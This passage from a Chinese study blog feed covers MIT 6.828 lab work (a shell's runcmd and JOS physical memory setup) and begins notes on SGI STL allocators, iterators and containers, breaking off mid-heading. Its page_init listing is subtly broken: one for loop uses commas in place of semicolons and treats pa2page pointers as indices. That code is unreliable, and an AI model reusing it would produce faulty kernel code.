<span class="title">pipecmd</span> *<span class="title">pcmd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">redircmd</span> *<span class="title">rcmd</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(cmd == <span class="number">0</span>)</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">switch</span>(cmd-&gt;type){</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unknown runcmd\n"</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">' '</span>:</span><br><span class="line">    ecmd = (<span class="keyword">struct</span> execcmd*)cmd;</span><br><span class="line">    <span class="keyword">if</span>(ecmd-&gt;argv[<span class="number">0</span>] == <span class="number">0</span>)</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Your code here ...</span></span><br><span class="line">    execve(ecmd-&gt;argv[<span class="number">0</span>],ecmd-&gt;argv,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">    rcmd = (<span class="keyword">struct</span> redircmd*)cmd;</span><br><span class="line">    <span class="comment">// Your code here ...</span></span><br><span class="line">    r = open(rcmd-&gt;file,rcmd-&gt;flags,S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);</span><br><span class="line">    <span class="keyword">if</span>(r==<span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">      perror(<span class="string">"no such file"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(dup2(r,rcmd-&gt;fd)==<span class="number">-1</span>)</span><br><span class="line">      perror(<span class="string">"dup2 fail"</span>);</span><br><span class="line">    runcmd(rcmd-&gt;cmd);</span><br><span class="line">    close(rcmd-&gt;fd);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'|'</span>:</span><br><span class="line">    <span class="keyword">if</span>(pipe(p)==<span class="number">-1</span>)</span><br><span class="line">      perror(<span class="string">"pipe create error"</span>);</span><br><span class="line">    pcmd = (<span class="keyword">struct</span> pipecmd*)cmd;</span><br><span class="line">    <span class="keyword">if</span>(fork1()==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">      close(p[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">if</span>(dup2(p[<span class="number">1</span>],STDOUT_FILENO)==<span class="number">-1</span>)</span><br><span class="line">        perror(<span class="string">"dup2 fail"</span>);</span><br><span class="line">      runcmd(pcmd-&gt;left);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">          wait(&amp;r);</span><br><span class="line">          close(p[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">if</span>(dup2(p[<span class="number">0</span>],STDIN_FILENO)==<span class="number">-1</span>)</span><br><span class="line">        perror(<span class="string">"dup2 fail"</span>);</span><br><span class="line">      runcmd(pcmd-&gt;right);   </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  }    </span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="Lab-2-Memory-Management"><a href="#Lab-2-Memory-Management" class="headerlink" title="Lab 2: Memory Management"></a>Lab 2: Memory Management</h2><h3 id="mem-init流程分析"><a href="#mem-init流程分析" class="headerlink" title="mem_init流程分析"></a>mem_init流程分析</h3><p>可以先看完下面的部分再来看流程分析.<br>删去了注释和check.<br>先<code>i386_detect_memory</code>检测机器的物理空间大小,然后使用boot_alloc分配一个kern_pgdir的页目录表.<br>再次boot_alloc为每一个物理页分配一个PageInfo管理结构.<br>之后<code>page_init</code>完成对整个物理页的初始化.标记不可分配或正在使用的物理页为inuse,完成空闲页链表page_free_list的创建.<br>在之后调用三次boot_map_region在kern_pgdir中完成对用户页表UPAGES,内核栈,内核地址空间的映射.<br>安装kern_pgdir替换之前临时的entry_pgdir.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">mem_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> cr0;</span><br><span class="line"><span class="type">size_t</span> n;</span><br><span class="line"></span><br><span class="line">i386_detect_memory();</span><br><span class="line"></span><br><span class="line">kern_pgdir = (<span class="type">pde_t</span> *) boot_alloc(PGSIZE);</span><br><span class="line"><span class="built_in">memset</span>(kern_pgdir, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kern_pgdir[PDX(UVPT)] = PADDR(kern_pgdir) | PTE_U | PTE_P;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pages = (<span class="keyword">struct</span> PageInfo* )boot_alloc(npages*<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo));</span><br><span class="line"><span class="built_in">memset</span>(pages,<span class="number">0</span>,npages*(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">page_init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir, UPAGES, npages*<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo), PADDR(pages), PTE_U|PTE_P);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir,KSTACKTOP-KSTKSIZE,KSTKSIZE,PADDR(bootstack),PTE_W|PTE_P);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir, KERNBASE, (<span class="number">1ULL</span> &lt;&lt; <span class="number">32</span>) - KERNBASE, <span class="number">0</span>, PTE_W);</span><br><span class="line"></span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cr0 = rcr0();</span><br><span class="line">cr0 |= CR0_PE|CR0_PG|CR0_AM|CR0_WP|CR0_NE|CR0_MP;</span><br><span class="line">cr0 &amp;= ~(CR0_TS|CR0_EM);</span><br><span class="line">lcr0(cr0);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Part-1-Physical-Page-Management"><a href="#Part-1-Physical-Page-Management" class="headerlink" title="Part 1: Physical Page Management"></a>Part 1: Physical Page Management</h3><p>写page_init之前回顾理解一下物理地址和虚拟地址的布局,在图中指出memlayout.h中各个宏定义表示的位置.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232009006.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232009885.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232010431.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">//设置第一页为inuse,保留实模式下的IDT和BIOS结构</span></span><br><span class="line"><span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">pages[i].pp_link = <span class="literal">NULL</span>;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将Base_memory全部设置为free.(basemem应该指低1MB的内存)</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; npages_basemem; ++i) {</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//将IO hole设置为inuse,避免被分配.</span></span><br><span class="line"><span class="keyword">for</span>(i = pa2page(IOPHYSMEM),i&lt;pa2page(EXTPHYSMEM),++i)</span><br><span class="line">{</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">pages[i].pp_link = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//将1MB以上的Kernel映像,kern_pgdir以及pages的页设置为inuse.</span></span><br><span class="line"><span class="keyword">for</span>(i = pa2page(EXTPHYSMEM);i&lt;pa2page(PADDR(boot_alloc(<span class="number">0</span>)));++i)</span><br><span class="line">{</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">pages[i].pp_link = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//将上方所有物理地址设置为free</span></span><br><span class="line"><span class="keyword">for</span>(;i&lt;npages;++i)</span><br><span class="line">{</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>之后就是page_alloc(),page_free().<br>如下是初看时的一些疑惑,我知道很蠢hh<br><del>我暂时并不理解这两个功能存在的必要,特别是把释放的物理页对应的pageinfo链入page_free_list链表中的操作.</del><br><del>我们在meminit中已经调用bootalloc为所有的物理页分配了一个对应的pageinfo结构,这些结构即使被page_free释放之后也不会被其他用途的内存分配重用,不存在像常见的内存分配机制的设立是为了提高内存利用率的原因.</del><br>解答:释放pageinfo结构,其实是表示对pageinfo对应物理页的释放与分配,用于操作系统的追踪管理,与提高内存利用率无关.</p><blockquote><p>The operating system must keep track of which parts of physical RAM are free and which are currently in use. JOS manages the PC’s physical memory with page granularity so that it can use the MMU to map and protect each piece of allocated memory.</p></blockquote><p><del>更不理解的,pageinfo结构中并没有记录对应物理页的地址,page2pa函数是通过pageinfo结构相对于pages的偏移来计算出对应的物理页的.但当page_insert调用page_alloc是从free_list中取出最后free的pageinfo结构,不与物理地址对应.</del><br>解答:page_alloc的作用是分配客户(相对于该函数来说)申请的一页的物理地址空间,客户并不在乎该物理地址空间位于哪里,page_alloc只是随便取出一个pageinfo结构,并将该pageinfo结构对应的物理页分配给客户.是先有pageinfo结构再有对应的物理页,而不是为某个特定的物理页分配pageinfo结构,自然不存在无法对应的问题.</p><p>关于pgdir_walk() boot_map_region() page_lookup() page_remove() page_insert()等函数的实现,主要理清内核虚拟地址(KADDR),物理地址,物理页,PageInfo等结构的关系,实现完后跟着check的报错一点点调整.太多了就不放出来了.详见github.</p><h3 id="Part-2-Virtual-Memory"><a href="#Part-2-Virtual-Memory" class="headerlink" title="Part 2: Virtual Memory"></a>Part 2: Virtual Memory</h3><p>详见github.</p><h3 id="Part-3-Kernel-Address-Space"><a href="#Part-3-Kernel-Address-Space" class="headerlink" title="Part 3: Kernel Address Space"></a>Part 3: Kernel Address Space</h3><p>详见github.</p><h4 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h4><h5 id="物理页面映射打印"><a href="#物理页面映射打印" class="headerlink" title="物理页面映射打印"></a>物理页面映射打印</h5><p>模仿实验中qemu的info pg命令实现showmappings.<br>合并打印原则是权限位相同且物理页相邻的页表合并打印,页目录表始终不合并.其实改进也简单但是时间挺紧的…<br>qemu中的info pg:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271912082.png"><br>showmappings:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271913080.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271926936.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271914406.png"></p><h4 id="一些小插曲"><a href="#一些小插曲" class="headerlink" title="一些小插曲"></a>一些小插曲</h4><p>memset崩了,刚开始猜测是引用到了当前页目录映射之外的物理地址,到崩溃现场之后发现又没问题,找了半天发现原来页目录表中虚拟地址低4MB没有写的权限。。。<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232256150.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((__aligned__(PGSIZE)))</span><br><span class="line"><span class="type">pde_t</span> entry_pgdir[NPDENTRIES] = {</span><br><span class="line"><span class="comment">// Map VA's [0, 4MB) to PA's [0, 4MB)</span></span><br><span class="line">[<span class="number">0</span>]</span><br><span class="line">= ((<span class="type">uintptr_t</span>)entry_pgtable - KERNBASE) + PTE_P,</span><br><span class="line"><span class="comment">// Map VA's [KERNBASE, KERNBASE+4MB) to PA's [0, 4MB)</span></span><br><span class="line">[KERNBASE&gt;&gt;PDXSHIFT]</span><br><span class="line">= ((<span class="type">uintptr_t</span>)entry_pgtable - KERNBASE) + PTE_P + PTE_W</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>又突然想到page_init后,page_free_list指向的头部页应该位于物理内存的最高处,确实是在当前页目录映射之外的,确实应该崩.检查之后发现在check_page_free_list函数中有这样一个处理free_list的操作.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (only_low_memory) {</span><br><span class="line"><span class="comment">// Move pages with lower addresses first in the free</span></span><br><span class="line"><span class="comment">// list, since entry_pgdir does not map all pages.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp1</span>, *<span class="title">pp2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> **<span class="title">tp</span>[2] =</span> { &amp;pp1, &amp;pp2 };</span><br><span class="line"><span class="keyword">for</span> (pp = page_free_list; pp; pp = pp-&gt;pp_link) {</span><br><span class="line"><span class="type">int</span> pagetype = PDX(page2pa(pp)) &gt;= pdx_limit;</span><br><span class="line">*tp[pagetype] = pp;</span><br><span class="line">tp[pagetype] = &amp;pp-&gt;pp_link;</span><br><span class="line">}</span><br><span class="line">*tp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">*tp[<span class="number">0</span>] = pp2;</span><br><span class="line">page_free_list = pp1;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SGI STL学习笔记</title>
      <link href="/2023/SGI-STL--Notes/"/>
      <url>/2023/SGI-STL--Notes/</url>
      
        <content type="html"><![CDATA[<p>所有内容均基于SGI STL.该项目仅作为本人学习C++STL库,数据结构与算法使用.</p><h2 id="内存置配器"><a href="#内存置配器" class="headerlink" title="内存置配器"></a>内存置配器</h2><p>容器使用内存置配器来进行内存空间的分配和释放.<br>为了适配STL标准,在实际使用的分配器实现一个上层接口类simple_alloc.该类默认使用第二级分配器</p><h3 id="第一级分配器-malloc-alloc-template"><a href="#第一级分配器-malloc-alloc-template" class="headerlink" title="第一级分配器 malloc_alloc_template"></a>第一级分配器 malloc_alloc_template</h3><p>该分配器在内部直接使用operator new/delete进行内存管理</p><h3 id="第二级分配器-default-alloc-template"><a href="#第二级分配器-default-alloc-template" class="headerlink" title="第二级分配器 default_alloc_template"></a>第二级分配器 default_alloc_template</h3><p>该分配器以小型内存池进行内存管理,减轻分配内存时的cookie占用的内存.</p><span id="more"></span><h4 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h4><p>维护一个free_list数组,每一个free_list是一个存放未分配内存的单向链表(的头指针).用来管理释放或未分配的内存.<br>另外维护两个所有二级分配器共用的静态指针start_free和end_free,分别指向空闲内存(空闲且未链入free_list)的首尾.<br>还有一个size_t类型的heap_size成员,在重新向操作系统malloc内存时会用到其来计算需要申请的空间大小,但不太懂其存在的意义.</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h5><p>当容器使用alloc分配空间时,若内存超过128bytes(MAX_BYTES)使用第一级分配器进行内存分配.反之使用第二级.</p><p>首先检查对应大小的free_list是否存在未分配空间.若有就直接取出.<br>如果没有,调用refill函数用空闲内存区域先填充free_list(内存充足的情况下每次链入20块),再取出一块完成分配.<br>refill函数其实只负责将从空闲内存区域取出的空间链入free_list,实际的取出工作由chunk_alloc函数完成.</p><p>chunk_alloc函数先检查空闲区域是否足够取出20个对应大小的堆块,若够则能取多少个取多少.如果一个的空间都不够,就先将空闲区域整个链入free_list对应大小链表中.然后调用malloc函数向系统申请2*20*nbytes(一个元素的大小)字节的空间.</p><h5 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h5><p>若内存超过128bytes,使用第一级分配器释放内存.<br>否则使用第二级分配器直接链入对应free_list中.</p><p>值得注意的时,第二级分配器并没有对free_list以及start_free~end_free之间区域的释放操作,这一操作最后将由操作系统完成?<br><a href="https://www.zhihu.com/question/38524347">STL allocator何时释放内存？</a></p><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>迭代器用来粘合算法和容器.</p><h4 id="Traits技法"><a href="#Traits技法" class="headerlink" title="Traits技法"></a>Traits技法</h4><h5 id="template参数推导机制"><a href="#template参数推导机制" class="headerlink" title="template参数推导机制"></a>template参数推导机制</h5><p>在算法中使用迭代器时,可能会使用到迭代器所指之物的型别,该型别可以利用template参数推导机制完成.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">I</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(I iter)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">func2</span>(iter,*iter);<span class="comment">//func2可通过参数推导机制获得iter所指型别</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>但如果func函数需要返回一个iter指向的对象,template推导机制就不起作用了</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//下列写法无法通过编译</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">I</span>&gt;</span><br><span class="line">(*I) <span class="built_in">func</span>(I iter)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">func2</span>(iter,*iter);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="内嵌型别声明"><a href="#内嵌型别声明" class="headerlink" title="内嵌型别声明"></a>内嵌型别声明</h5><p>我们可以使用内嵌型别声明的方法解决该问题.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Iterator</span>{</span><br><span class="line"><span class="keyword">typedef</span> T value_type;</span><br><span class="line">......</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">I</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">typename</span> I::value_type <span class="title">func</span><span class="params">(I iter)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">func2</span>(iter,*iter);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>对于泛型算法,不仅需要接受迭代器,还需要能够接受一个原生指针作为参数,而原生指针没有,我们也无法为其内嵌一个名为value_type的变量<br>于是需要用到traits技法</p><h5 id="Traits"><a href="#Traits" class="headerlink" title="Traits"></a>Traits</h5><p>使用中间层traits,利用template参数推导机制进行偏特化,将原生指针和迭代器统一.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304061931218.webp"></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">iterator_traits</span> {</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> T::value_type value_type;</span><br><span class="line">};</span><br><span class="line"><span class="comment">// 偏特化1</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">iterator_traits</span>&lt;T*&gt; {</span><br><span class="line">    <span class="keyword">typedef</span> T value_type;</span><br><span class="line">};</span><br><span class="line"><span class="comment">// 偏特化2</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">iterator_traits</span>&lt;<span class="type">const</span> T*&gt; {</span><br><span class="line">    <span class="keyword">typedef</span> T value_type;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>根据迭代器操作容器元素的方式,分为InputIterator和OutputIterator<br>根据迭代器遍历容器的方式,分为ForwardIterator,BidirectionalIterator,RandomAccessIterator等.</p><p>为了使函数能够获取迭代器的类型,将类型标签定义为一个新类型,再以traits方式型别声明为category,使用时进行萃取.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">input_iterator_tag</span>{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">output_iterator_tag</span>{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">forward_iterator_tag</span>:<span class="keyword">public</span> input_iterator_tag{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">bidirectional_iterator_tag</span>:<span class="keyword">public</span> forward_iterator_tag{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">random_access_iterator_tag</span>:<span class="keyword">public</span> bidirectional_iterator_tag{};</span><br></pre></td></tr></tbody></table></figure><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><p>单端开口的连续线性空间容器</p><h4 id="迭代器-1"><a href="#迭代器-1" class="headerlink" title="迭代器"></a>迭代器</h4><p>由于该容器的空间是连续线性的,故其迭代器为原生指针.迭代器在扩容后失效</p><h4 id="成员变量-1"><a href="#成员变量-1" class="headerlink" title="成员变量"></a>成员变量</h4><p>维护了三个指针(即vector的迭代器类型),start指向vector已存储区域的开头,finish指向vector中已存储区域的末尾,end_of_storage指向vector总存储空间的末尾.</p><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><p>加入新元素时,若存储空间充足就直接在finish构造元素,若存储空间不足便申请二倍存储空间,将原空间内容拷贝到新申请的空间,再释放掉原有空间.<br>由于扩容操作会使vector中所有元素迁移,故迭代器失效.</p><h4 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h4><p>由于迭代器失效,若程序有对迭代器的保存动作,可能造成uaf,double free等安全问题.</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>两端开口的双向环状链表</p><h4 id="迭代器-2"><a href="#迭代器-2" class="headerlink" title="迭代器"></a>迭代器</h4><p>Bidirectional迭代器.内嵌一个链表结点指针.以链表结点的指针完成迭代.迭代器不会失效</p><h4 id="成员变量-2"><a href="#成员变量-2" class="headerlink" title="成员变量"></a>成员变量</h4><p>仅维护一个环状链表中的空结点指针</p><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h4><p>和普通双向环状链表区别不大.<br>注意一下5个基本操作,有助于对list空间结构的想象.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iterator <span class="title function_">begin</span><span class="params">()</span> { <span class="keyword">return</span> (link_type)(node-&gt;next); }</span><br><span class="line">iterator <span class="title function_">end</span><span class="params">()</span> { <span class="keyword">return</span> (link_type)node; }</span><br><span class="line"><span class="type">bool</span> <span class="title function_">empty</span><span class="params">()</span> { <span class="keyword">return</span> node-&gt;next == node; }</span><br><span class="line">reference <span class="title function_">front</span><span class="params">()</span> { <span class="keyword">return</span> *begin(); }</span><br><span class="line">reference <span class="title function_">back</span><span class="params">()</span> { <span class="keyword">return</span> *(--end()); }</span><br></pre></td></tr></tbody></table></figure><h3 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h3><p>两端开口的连续线性空间.(连续线性空间实则是伪造的)</p><h4 id="迭代器-3"><a href="#迭代器-3" class="headerlink" title="迭代器"></a>迭代器</h4><p>内含四个指针,分别为value_type*类型的cur,first,last分别指向所在缓冲区的当前元素,头部,尾部.另一个map_pointer指向deque的管控中心map(不是STL中的容器map)</p><p>deque的连续线性空间伪造主要依靠的便是迭代器,迭代器在到达一片缓冲区的末尾时跳跃到下一缓冲区或到达开头时跳转到上一个缓冲区,伪造出连续的空间.</p><h4 id="成员变量-3"><a href="#成员变量-3" class="headerlink" title="成员变量"></a>成员变量</h4><p>指向map的指针和map_size.迭代器start,finish分别关联第一个和最后一个缓冲区</p><h4 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h4><p>主要是map的扩容.</p><h3 id="RB-tree"><a href="#RB-tree" class="headerlink" title="RB-tree"></a>RB-tree</h3><p>具有排序的平衡二叉树,用于快速查找.</p><h4 id="迭代器-4"><a href="#迭代器-4" class="headerlink" title="迭代器"></a>迭代器</h4><p>内含一个指向树结点的指针,increment和decrement操作使迭代器指向比当前结点值大的最小元素.(对迭代器而言并没有”大小”的概念,例如increment只是简单的移动到右节点,然后持续移动到左叶子结点.”大小的概念由容器插入节点的树成长过程体现”)</p><h4 id="成员变量-4"><a href="#成员变量-4" class="headerlink" title="成员变量"></a>成员变量</h4><p>一个header指针,一个node_count,一个用于元素比较的仿函数.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141728705.png"></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="copy"><a href="#copy" class="headerlink" 